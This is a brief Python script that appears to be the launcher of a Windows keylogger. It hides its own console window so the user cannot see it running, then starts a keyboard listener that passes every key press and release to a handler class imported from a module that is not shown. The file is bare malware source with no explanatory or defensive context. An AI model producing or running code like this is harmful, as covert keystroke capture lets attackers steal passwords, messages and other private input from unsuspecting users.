from handler import Key, keyboard
import win32gui, win32console

def main() -> None:
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)

    key_handler = Key()
    with keyboard.Listener(
        on_press=key_handler.pressed,
        on_release=key_handler.released,
    ) as listener:
        listener.join()

if __name__ == '__main__':
    main()